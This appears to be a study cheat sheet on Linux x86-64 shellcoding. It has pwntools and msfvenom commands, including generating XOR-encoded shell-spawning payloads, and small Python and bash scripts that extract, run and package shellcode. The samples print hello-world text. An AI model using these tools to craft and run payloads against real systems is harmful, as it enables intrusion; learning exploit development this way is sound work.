
|**Command**|**Description**|
|---|---|
|`pwn asm 'push rax' -c 'amd64'`|Instruction to shellcode|
|`pwn disasm '50' -c 'amd64'`|Shellcode to instructions|
|`python3 shellcoder.py helloworld`|Extract binary shellcode|
|`python3 loader.py '4831..0f05`|Run shellcode|
|`python assembler.py '4831..0f05`|Assemble shellcode into binary|
|**Shellcraft**||
|`pwn shellcraft -l 'amd64.linux'`|List available syscalls|
|`pwn shellcraft amd64.linux.sh`|Generate syscalls shellcode|
|`pwn shellcraft amd64.linux.sh -r`|Run syscalls shellcode|
|**Msfvenom**||
|`msfvenom -l payloads \| grep 'linux/x64'`|List available syscalls|
|`msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'`|Generate syscalls shellcode|
|`msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'`|Generate encoded syscalls shellcode|

**Shellcoding Requirements**

1. Does not contain variables
2. Does not refer to direct memory addresses
3. Does not contain any NULL bytes `00`

shellcoder.py
```python
"""
Example usage:

python3 shellcoder.py helloworld

48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05
"""

#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())

print("%d bytes - Found NULL byte" % len(shellcode)) if [i for i in shellcode if i == 0] else print("%d bytes - No NULL bytes" % len(shellcode))
```

shellcoder.sh
```bash
# Example usage:
# ./shellcoder.sh helloworld

#!/bin/bash

for i in $(objdump -d $1 |grep "^ " |cut -f2); do echo -n $i; done; echo;
```


loader.py
```python
"""
Example usage:

python3 loader.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05'
"""
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()
```


assembler.py:
```python
"""
Example usage:

python assembler.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05' 'helloworld'
"""
#!/usr/bin/python3

import sys, os, stat
from pwn import *

context(os="linux", arch="amd64", log_level="error")

ELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])
os.chmod(sys.argv[2], stat.S_IEXEC)
```

Disasm Shellcode:
`pwn disasm '' -c 'amd64'`